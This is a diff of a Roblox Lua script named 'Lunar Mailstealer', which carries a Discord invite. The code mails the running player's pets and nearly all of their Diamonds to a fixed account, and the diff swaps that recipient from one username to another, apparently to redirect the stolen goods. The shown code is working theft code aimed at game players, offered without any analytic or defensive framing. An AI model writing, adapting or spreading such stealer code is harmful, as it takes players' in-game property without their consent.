@@ -82,7 +82,7 @@ for i,v in pairs(savedPets) do
 		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
 		local args = {
     	[1] = {
-        ["Recipient"] = "xPSXMoon",
+        ["Recipient"] = "dev_yaskofafa",
         ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
         ["Pets"] = {v.uid},
         ["Message"] = "Lunar Mailstealer | .gg/pd65DxGhVc"
@@ -98,7 +98,7 @@ for i,v in pairs(savedPets) do
 		_G.Diamonds = 0
 		local args = {
     	[1] = {
-        ["Recipient"] = "xPSXMoon",
+        ["Recipient"] = "dev_yaskofafa",
         ["Diamonds"] = 0,
         ["Pets"] = {v.uid},
         ["Message"] = "Lunar Mailstealer | .gg/pd65DxGhVc"
